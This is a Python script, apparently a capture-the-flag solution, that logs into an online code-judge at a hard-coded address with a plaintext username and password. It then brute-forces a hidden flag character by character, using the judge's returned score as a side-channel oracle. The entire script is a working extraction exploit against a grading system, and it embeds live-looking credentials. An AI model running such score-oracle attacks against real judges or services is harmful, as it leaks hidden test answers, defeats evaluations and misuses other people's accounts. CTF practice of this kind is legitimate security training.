#!/usr/bin/env python3

import requests
import string
import re

charset = string.ascii_letters + string.digits + "_{}"
known = ""
session = requests.Session()

login_url = "http://140.112.91.4:45510/login"
submit_url = "http://140.112.91.4:45510/submit/3"

# login
res = session.post(login_url, data={
    "username": "fysty",
    "password": "mortis00"
})
assert "Logout" in session.get("http://140.112.91.4:45510/").text

while len(known) < 15:
    best_score = -1
    best_ch = None
    for ch in charset:
        test = known + ch
        code = f'print("{test}")'
        res = session.post(submit_url, data={
            "code": code,
            "language": "python"
        })

        match = re.search(r'Submission Result for Problem 3: .*?, (\d+)', res.text)
        if match:
            score = int(match.group(1))
            print(f"Trying {test}: score {score}")
            if score > best_score:
                best_score = score
                best_ch = ch

    if best_ch:
        known += best_ch
        print(f"Found next char: {best_ch} → {known}")
    else:
        print("No progress. Stopping.")
        break

print(f"\nflag2: {known}")
